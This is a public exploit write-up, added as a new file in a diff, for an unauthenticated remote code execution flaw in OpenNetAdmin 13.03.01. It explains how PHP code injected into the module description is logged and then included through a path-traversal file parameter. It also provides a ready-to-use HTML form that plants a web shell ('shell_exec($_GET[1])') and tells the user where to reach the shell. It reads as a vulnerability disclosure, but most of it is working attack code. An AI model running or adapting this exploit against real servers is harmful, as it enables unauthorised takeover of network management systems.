@@ -1,0 +1,81 @@
+# Exploit Title: OpenNetAdmin Remote Code Execution
+# Date: 03/04/13
+# Exploit Author: Mandat0ry (aka Matthew Bryant)
+# Vendor Homepage: http://opennetadmin.com/
+# Software Link: http://opennetadmin.com/download.html
+# Version: 13.03.01
+# Tested on: Ubuntu
+# CVE : No CVE exists - 0day exploit - probably works on the demo on
+their site as well! So they should be alerted.
+
+OpeNetAdmin Remote Code Execution Exploit by Mandat0ry (aka Matthew Bryant)
+
+Info:
+This exploit works because adding modules can be done without any sort
+of authentication.
+
+Modules are in this form:
+module[name] = The name of the function that will be run out of the
+included file
+module[description] = Irrelevant description of the module (unless
+some PHP code is injected here hmm?)
+module[file] = The file to be included and then the function
+module[name] will be run from this included file
+
+This exploit works by injecting some PHP code into the
+/var/log/ona.log file via the module description parameter.
+Everytime a module is added to OpenNetAdmin the description/name/etc
+are all logged into this log file.
+
+So...
+
+By simply setting the module filepath to
+"../../../../../../../../../../../var/log/ona.log" (add or remove dots
+at will) we can include the log file as a module. Where it gets clever
+is remember the description is logged! So we can add PHP code into the
+description and thus the logs and it will be executed on inclusion of
+this file! The PHP interpreter will ignore everything not enclosed in
+PHP tags so it will only run the code we inject. This is basically a
+spin off of Apache log injection exploitation. Once the module has been added all you have
+to do is run it via "dcm.php?module=". This all works without any
+guest account etc.
+
+NOTE: Because of the way the logger script works we cannot use any "="
+in our injected code as it will be escaped before being added to the
+logs ("\=") so avoid using it!
+
+Cool software but the code has a lot to be desired, I imagine their
+are a LOT more exploits than what I found but once I had RCE I was
+satisfied.
+
+Proof of concept code for easy exploitation. Run this and then go to
+http://URLHERE/ona/dcm.php?module=mandat0ry for your shell!
+
+<center>
+<head>
+<title>0wned Your Network</title>
+<script type="text/javascript">
+function changeaction()
+{
+    document.sploit.action = document.getElementById("url").value;
+    alert('Remember, your shell must be accessed via
+'+document.getElementById("url").value+'?module=mandat0ry');
+}
+</script>
+</head>
+<font size="5">OpenNetAdmin RCE Exploit</font><br />
+<font size="2"><i>Now with leet button sploiting action! (oooh,
+ahhh!)</i></font><br /><br />
+<form action="/" method="post" name="sploit" onsubmit="changeaction()" >
+URL: <input id="url" value="http://127.0.0.1/ona/dcm.php" size="50" /><br />
+PHP Code to Execute: <input type="text" size="50" name="options[desc]"
+value="<?php echo shell_exec($_GET[1]) ?>"/> <br />
+<input type="hidden" name="module" value="add_module" />
+<input type="hidden" name="options[name]" value="mandat0ry" />
+<input type="hidden" name="options[file]"
+value="../../../../../../../../../../../var/log/ona.log" />
+<input type="submit" value="Exploit!" />
+</form>
+<b><i>Special thanks to: offsec, twitches, funkenstein, zachzor,
+av1dmage, drc, arsinh, and the coders for OpenNetAdmin!</i></b>
+</center>
